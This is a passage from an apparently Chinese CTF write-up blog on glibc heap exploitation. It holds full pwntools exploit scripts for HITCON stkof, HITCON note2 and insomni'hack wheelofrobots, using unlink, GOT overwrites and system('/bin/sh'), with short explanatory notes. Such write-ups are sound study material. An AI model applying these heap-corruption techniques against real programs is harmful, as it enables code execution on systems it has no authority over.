(<span class="built_in">hex</span>(one_shot))</span><br><span class="line">one_shot1 = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(one_shot)[-<span class="number">2</span>:]</span><br><span class="line">one_shot2 = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(one_shot)[-<span class="number">6</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> (one_shot1,one_shot2)</span><br><span class="line">one_shot1 = <span class="built_in">int</span>(one_shot1,<span class="number">16</span>)</span><br><span class="line">one_shot2 = <span class="built_in">int</span>(one_shot2,<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">delete2()</span><br><span class="line"> </span><br><span class="line">payload3 = <span class="built_in">bytes</span>(<span class="string">&#x27;%&#123;&#125;d%13$hhn&#x27;</span>.<span class="built_in">format</span>(one_shot1),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload3 += <span class="built_in">bytes</span>(<span class="string">&#x27;%&#123;&#125;d%14$hn&#x27;</span>.<span class="built_in">format</span>(one_shot2-one_shot1),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload3 += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload3))</span><br><span class="line">payload3 += p8(<span class="number">0x0</span>)*(<span class="number">0x88</span>-<span class="built_in">len</span>(payload3))</span><br><span class="line">payload3 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit1(payload3)</span><br><span class="line"> </span><br><span class="line">payload4 = <span class="string">b&#x27;5&#x27;</span> + p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(ret_addr) + p64(ret_addr+<span class="number">1</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0x5-0x6</strong></p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><strong>难度:★★</strong></p><p>非常经典的unlink题目</p><p>其最大的利用点是其edit功能无大小限制,可以读取任意大小数据,依此可以做到覆盖下一个chunk的prev_size和size,从而达到unlink的功能</p><p><strong>注意点1:</strong>这题的第一次o操作是在第一个chunk申请后,也就是说第一个我们申请的chunk的后面会是一个stdout的缓冲区,是我们无法利用的,因此需一个chunk引出ochunk,之后正常利用</p><p><strong>注意点2:</strong>这题没有任何能够输出有效信息的功能,故而一切有效利用信息,都需要通过基于unlink实现的改写got表,通过puts函数泄露信息,最后wiki选择的是修改atoi函数为system,但我选择的再次修改free_got,另外wiki的exp最后好像有一点问题..</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">head=<span class="number">0x602140</span>  <span class="comment">#but the first not use so....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">idx,length,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)   <span class="comment">#ensure chunksize &gt;MAX_fastbin(0x80)</span></span><br><span class="line"><span class="comment">#alloc(0x20)</span></span><br><span class="line"></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(head-<span class="number">0x8</span>)+p64(head)+p64(<span class="number">0x20</span>)<span class="comment">#fake chunk and unlink trigger</span></span><br><span class="line">payload1=payload1.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#pudding</span></span><br><span class="line">payload1+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)  <span class="comment">#edit prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#trigger unlink</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(e.got[<span class="string">&#x27;free&#x27;</span>])+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment">#depoloy 0,1,2</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,<span class="number">8</span>,p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))  <span class="comment">#free -&gt;puts</span></span><br><span class="line">free(<span class="number">1</span>)  <span class="comment">##puts(plt_addr)</span></span><br><span class="line">puts_got=p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">puts_got=u64(puts_got)</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt:&#x27;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">libc_base=puts_got-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read(<span class="number">2</span>,<span class="number">8</span>,p64(system))<span class="comment">#free -&gt; puts -&gt; system</span></span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">read(<span class="number">4</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)<span class="comment">#system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题chunk靠不靠近top_chunk不是很重要影响不大</p><p>另外特别要注意一点是:<strong>chunk3的大小要超过fastbin的最大大小</strong>,不然的话释放chunk3<u>直接进入fastbin</u>就不会触发unlink了</p><p><strong>最后提一下gdb的显示问题,gdb会从堆的开始判断chunk的个数,以这题为例,unlink后chunk2和chunk3依然存在,这是因为gdb先判断的chunk2,这样就把我们伪造的chunk的头给包含进chunk2了,于是unlink后的chunk就没有被gdb识别,反而chunk3继续存在</strong></p><h2 id="2014HITCON-note2"><a href="#2014HITCON-note2" class="headerlink" title="2014HITCON note2"></a>2014HITCON note2</h2><p><strong>难度:★★</strong></p><p>和上一题几乎一个套路,也是标准的unlink题</p><p>防护pie没开,以及got表可写</p><p>关键的利用点在于一个整数溢出点,是的可以达到无限读的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_4009BD</span><span class="params">(__int64 a1, __int64 a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>i是无符号整型,a2是有符号数,如果a2等于0,那么a2-1就是-1就会被视为一个极大的无符号数</p><p>其它和上一题一个套路</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">note2 = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">ptr0=<span class="number">0x602120</span></span><br><span class="line">content=p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)+p64(ptr0-<span class="number">0x18</span>)+p64(ptr0-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x60</span>)  </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;name&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;address&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">newnote(<span class="number">0x80</span>,content)</span><br><span class="line">newnote(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">newnote(<span class="number">0x80</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">content=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(note2.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,content)</span><br><span class="line"></span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">atoi_addr=u64(atoi_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">libc_base=atoi_addr-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">content = p64(system_addr)</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\bin\sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>注意点:</strong>strnat,strcpy这些函数结束判断都与’\0’有极大关系,故而相关填充时就不能随意填充0了,否则可能达不到我们需要的效果</p><h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p><strong>难度:★★★</strong></p><p>难度更上一筹,对漏洞的发现能力要求更高</p><p>防护依然是canary和nx</p><p><strong>利用点1:</strong>读取选项的函数,读取5个字节,最后一个字节恰好能覆盖到bender的inuse状态位</p><p><strong>利用点2:</strong>在添加 Destructor 轮子的时候，并没有进行大小检测。如果读取的数为负数，那么在申请<code>calloc(1uLL, 20 * v5);</code> 时就可能导致 <code>20*v5</code> 溢出，但与此同时， <code>destructor_size = v5</code> 仍然会很大。</p><p>利用思路要更复杂,要记清楚各个指针的地址就不容易了,逻辑也要更清晰才行</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./wofr&quot;</span></span><br><span class="line">robots = ELF(<span class="string">&#x27;./wofr&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./wofr&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    p.recvuntilb(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;step 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line">    <span class="comment"># so it is in fastbin, idx2-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># idx2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow bender inuse with 1</span></span><br><span class="line">    overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change bender&#x27;s fd to 0x603138, point to bender&#x27;s size</span></span><br><span class="line">    <span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># in order add bender again</span></span><br><span class="line">    overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line">    <span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line">    <span class="comment"># it is at Robot Devil</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wheels must &lt;= 3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alloc Destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alloc devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit destructor&#x27;s size to 1000 by tinny</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># place fake chunk at destructor&#x27;s pointer</span></span><br><span class="line">    fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(</span><br><span class="line">        fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">    fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">    change(<span class="number">6</span>, fakechunk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger unlink</span></span><br><span class="line">    remove(<span class="number">3</span>) <span class="comment">#unlink 6</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make 0x6030F8 point to 